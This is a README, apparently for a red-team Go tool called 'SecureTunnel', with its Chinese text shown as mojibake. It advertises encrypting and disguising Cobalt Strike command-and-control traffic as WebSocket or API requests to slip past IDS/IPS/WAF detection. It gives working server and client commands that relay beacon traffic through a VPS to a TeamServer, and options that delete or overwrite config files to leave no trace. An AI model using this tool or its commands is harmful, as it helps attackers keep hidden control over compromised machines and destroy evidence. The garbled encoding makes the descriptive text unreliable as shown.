# ğŸ” SecureTunnel | ä¸€æ¬¾ä¸“ä¸šçš„ C2 æµé‡åŠ å¯†éš§é“å·¥å…·

> è½»æ¾è§„é¿ IDS/IPS æ£€æµ‹ï¼Œè®©ä½ çš„ C2 æµé‡éšäºæ— å½¢

---

## ğŸ“Œ å·¥å…·ç®€ä»‹

**SecureTunnel** æ˜¯ä¸€æ¬¾åŸºäº Go è¯­è¨€å¼€å‘çš„æµé‡åŠ å¯†éš§é“å·¥å…·ï¼Œä¸“ä¸ºçº¢é˜Ÿè¡ŒåŠ¨è®¾è®¡ã€‚

### ğŸ¯ åº”ç”¨åœºæ™¯

- ğŸ›¡ï¸ **è§„é¿æµé‡æ£€æµ‹** - åŠ å¯† C2 é€šä¿¡ï¼Œç»‘è¿‡ IDS/IPS/WAF ç‰¹å¾æ£€æµ‹
- ğŸ” **å¯¹æŠ—æµé‡åˆ†æ** - æ¶ˆé™¤ CobaltStrike ç­‰å·¥å…·çš„æµé‡æŒ‡çº¹
- ğŸŒ **ç©¿é€é˜²ç«å¢™** - WebSocket æ¨¡å¼ä¼ªè£…æˆæ­£å¸¸ Web æµé‡
- ğŸ­ **éšè”½é€šä¿¡** - è‡ªå®šä¹‰è·¯å¾„ï¼Œä¼ªè£…æˆåˆæ³• API è¯·æ±‚

### âœ¨ æ ¸å¿ƒä¼˜åŠ¿

| ä¼˜åŠ¿ | è¯´æ˜ |
|------|------|
| ğŸ”’ **å†›å·¥çº§åŠ å¯†** | AES-256-CFB æµåŠ å¯†ï¼Œæ¯åŒ…éšæœº IV |
| ğŸŒŠ **æµé‡ä¼ªè£…** | WebSocket æ¨¡å¼ï¼Œæµé‡ç‰¹å¾ä¸æ­£å¸¸ Web æ— å¼‚ |
| ğŸ“„ **é˜…åå³ç„š** | é…ç½®æ–‡ä»¶å¯åŠ¨åè‡ªåŠ¨é”€æ¯ï¼Œä¸ç•™ç—•è¿¹ |
| ğŸ›¡ï¸ **è®¿é—®æ§åˆ¶** | IP é»‘ç™½åå•ï¼Œé˜²æ­¢æœªæˆæƒè®¿é—® |
| âš¡ **é«˜æ€§èƒ½** | Go åç¨‹å¹¶å‘ï¼Œè½»æ¾å¤„ç†ä¸Šåƒè¿æ¥ |
| ğŸ–¥ï¸ **è·¨å¹³å°** | Windows / Linux / macOS å…¨æ”¯æŒ |

---

## ğŸš€ å¿«é€Ÿä¸Šæ‰‹

### 1ï¸âƒ£ åŸºç¡€æ¨¡å¼ï¼ˆTCP åŠ å¯†éš§é“ï¼‰

**Server ç«¯ (VPS)ï¼š**
```bash
./tunnel -mode server -listen 0.0.0.0:8888 -target 127.0.0.1:50050 -password "MyPass123"
```

**Client ç«¯ (è·³æ¿æœº)ï¼š**

```bash
./tunnel -mode client -listen 127.0.0.1:443 -server vps.com:8888 -password "MyPass123"
```

### 2ï¸âƒ£ WebSocket æ¨¡å¼ï¼ˆå¼ºçƒˆæ¨è ğŸ”¥ï¼‰

æµé‡ä¼ªè£…æˆæ­£å¸¸ WebSocket é€šä¿¡ï¼Œæœ‰æ•ˆè§„é¿æ·±åº¦åŒ…æ£€æµ‹ï¼š

```bash
# Server - ä¼ªè£…æˆ API æ¥å£
./tunnel -mode server -listen 0.0.0.0:443 -target 127.0.0.1:50050 -password "MyPass" -ws -ws-path /api/v1/stream


# Client
./tunnel -mode client -listen 127.0.0.1:443 -server vps.com:443 -password "MyPass" -ws -ws-path /api/v1/stream
```

clientç«¯

![image-20251215211401884](assets/image-20251215211401884.png)

serverç«¯

![image-20251215211343134](assets/image-20251215211343134.png)

æµé‡ä¾§ï¼Œcobalstrikeæµé‡ä¸ºwebSocetåè®®åŠ å¯†æµé‡

![image-20251215211752268](assets/image-20251215211752268.png)

cobalstrikeç«¯ï¼Œå‘½ä»¤æ‰§è¡Œæ­£å¸¸

![image-20251215211604703](assets/image-20251215211604703.png)

### 3ï¸âƒ£ é…ç½®æ–‡ä»¶æ¨¡å¼

```bash
# ç”Ÿæˆé…ç½®æ–‡ä»¶
./tunnel -gen-config config.yaml

# å¯åŠ¨åè‡ªåŠ¨åˆ é™¤é…ç½®æ–‡ä»¶ (ä¸ç•™ç—•è¿¹)
./tunnel -config config.yaml -delete-config

# å®‰å…¨åˆ é™¤ (è¦†å†™ååˆ é™¤ï¼Œé˜²æ­¢æ•°æ®æ¢å¤)
./tunnel -config config.yaml -secure-delete
```

### 4ï¸âƒ£ IP ç™½åå•ï¼ˆé˜²æ­¢çˆ†ç ´ï¼‰

```bash
./tunnel -mode server -listen 0.0.0.0:8888 -target 127.0.0.1:50050 -password "MyPass" \
  -acl -acl-mode whitelist -acl-whitelist "192.168.1.0/24,10.0.0.1"
```

---

## ğŸ“‹ å‚æ•°é€ŸæŸ¥

| å‚æ•° | è¯´æ˜ |
|------|------|
| `-mode` | server / client |
| `-listen` | ç›‘å¬åœ°å€ |
| `-target` | ç›®æ ‡åœ°å€ |
| `-server` | Server åœ°å€ (Client ç”¨) |
| `-password` | åŠ å¯†å¯†ç  |
| `-ws` | å¯ç”¨ WebSocket (æ¨è) |
| `-ws-path` | WebSocket è·¯å¾„ |
| `-config` | é…ç½®æ–‡ä»¶è·¯å¾„ |
| `-delete-config` | å¯åŠ¨ååˆ é™¤é…ç½® |
| `-secure-delete` | å®‰å…¨åˆ é™¤é…ç½® |
| `-acl` | å¯ç”¨è®¿é—®æ§åˆ¶ |
| `-acl-whitelist` | IP ç™½åå• |

---

## ğŸ¯ éƒ¨ç½²æ¶æ„

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Beacon  â”‚ â”€â”€â”€â–¶ â”‚  Client  â”‚ â•â•â•â–¶ â”‚  Server  â”‚ â”€â”€â”€â–¶ â”‚ TeamServer â”‚
â”‚  (ç›®æ ‡)  â”‚      â”‚ (è·³æ¿æœº) â”‚      â”‚  (VPS)   â”‚      â”‚   (C2)     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
   HTTP/S              â”‚                  â”‚              TCP
                       â””â”€ AES-256 åŠ å¯† â”€â”€â”€â”˜
                         (è§„é¿æ£€æµ‹)
```

---

## ğŸ”§ ç¼–è¯‘

```bash
# Windows
go build -ldflags="-s -w" -o tunnel.exe ./cmd/tunnel

# Linux
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o tunnel_linux ./cmd/tunnel
```

---

**âš ï¸ å…è´£å£°æ˜ï¼š** æœ¬å·¥å…·ä»…ä¾›æˆæƒå®‰å…¨æµ‹è¯•ä½¿ç”¨ï¼Œè¯·éµå®ˆç›¸å…³æ³•å¾‹æ³•è§„ã€‚

---

**ğŸ”” å…³æ³¨æˆ‘ä»¬ï¼Œè·å–æ›´å¤šçº¢é˜Ÿå·¥å…·ï¼**

*#çº¢é˜Ÿå·¥å…· #æµé‡åŠ å¯† #è§„é¿æ£€æµ‹ #CobaltStrike*
